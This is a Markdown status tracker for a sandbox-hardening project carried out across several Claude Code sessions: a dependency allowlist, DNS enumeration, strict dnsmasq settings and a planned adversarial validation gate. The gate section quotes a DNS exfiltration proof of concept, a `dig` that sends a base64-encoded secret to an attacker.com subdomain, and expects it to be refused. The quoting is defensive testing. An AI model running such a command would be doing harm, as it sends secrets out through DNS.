# Status — Actionable sessions

> Click `→ prompt` to open the `sessions/session-NN.md` file to paste into
> a fresh Claude Code session.
> For the detailed history (reasons, files touched, gotchas), see
> [LOG.md](LOG.md). For current code state, see [EXISTING.md](EXISTING.md).

| Session | Brief | Status | Prompt |
|---|---|---|---|
| 1 | scan-deps-audit — `/scan-deps` over project, pre-allowlist npm install domains | ✅ | — |
| 2 | cdn-cname-enumeration — parse mitmproxy.log, list hosts contacted in practice, categorise delta vs domains.txt | ✅ | — |
| 3 | dnsmasq-strict — drop catch-all server, generalise sibling resolve, add integration test | ✅ | — |
| 4 | adversarial-validation — gate session, replay PoC #9, verify no regression | 📋 | [→ prompt](sessions/session-4-adversarial-validation.md) |

## Legend

✅ delivered · 🚧 in progress · 📋 planned · ⚠️ blocked · ❌ cancelled

## Progress

- **Delivered** : 3 / 4
- **Next focus** : session 4 (adversarial-validation — gate)

## Gate

Session 4 (adversarial-validation) **gates** the v2 rollout. The PoC
from v1's #9 vector (`dig $(base64 secret).attacker.com @127.0.0.53` →
real IP returned) must return REFUSED after session 3 is delivered.
If still resolves : the dnsmasq config didn't take effect, debug
before declaring v2 complete.
